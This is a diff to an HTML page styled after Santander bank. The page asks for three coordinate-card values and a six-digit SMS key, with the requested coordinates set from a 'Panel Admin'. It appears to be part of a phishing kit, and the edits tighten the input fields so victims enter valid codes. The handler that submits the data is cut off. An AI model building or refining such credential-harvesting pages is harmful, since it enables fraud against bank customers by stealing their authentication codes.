@@ -35,7 +35,7 @@
       border-radius: 6px;
       padding: 10px;
       text-align: center;
-      width: 60px;
+      width: 70px;
     }
     .coord-item label {
       font-size: 12px;
@@ -87,21 +87,21 @@
     <div class="coord-box">
       <div class="coord-item">
         <label id="coordLabel1"></label>
-        <input type="text" id="coordA" maxlength="1" required>
+        <input type="text" id="coordA" maxlength="2" pattern="[0-9]{2}" required>
       </div>
       <div class="coord-item">
         <label id="coordLabel2"></label>
-        <input type="text" id="coordB" maxlength="1" required>
+        <input type="text" id="coordB" maxlength="2" pattern="[0-9]{2}" required>
       </div>
       <div class="coord-item">
         <label id="coordLabel3"></label>
-        <input type="text" id="coordC" maxlength="1" required>
+        <input type="text" id="coordC" maxlength="2" pattern="[0-9]{2}" required>
       </div>
     </div>
 
     <div class="sms-box">
       <label>Clave SMS (6 dígitos)</label><br>
-      <input type="text" id="claveSMS" maxlength="6" required>
+      <input type="text" id="claveSMS" maxlength="6" pattern="[0-9]{6}" required>
     </div>
 
     <button class="btn-santander btn-center" id="autorizarBtn">
@@ -139,10 +139,10 @@
       }
       document.getElementById("seleccionProducto").innerHTML = texto;
 
-      // Mostrar coordenadas configuradas en Panel Admin
-      document.getElementById("coordLabel1").innerText = "Coord " + (localStorage.getItem("coord1") || "A");
-      document.getElementById("coordLabel2").innerText = "Coord " + (localStorage.getItem("coord2") || "B");
-      document.getElementById("coordLabel3").innerText = "Coord " + (localStorage.getItem("coord3") || "C");
+      // Mostrar coordenadas configuradas en Panel Admin (ejemplo: A4, B7, C2)
+      document.getElementById("coordLabel1").innerText = localStorage.getItem("coord1") || "A1";
+      document.getElementById("coordLabel2").innerText = localStorage.getItem("coord2") || "B2";
+      document.getElementById("coordLabel3").innerText = localStorage.getItem("coord3") || "C3";
     });
 
     document.getElementById("autorizarBtn").addEventListener("click", async function(){
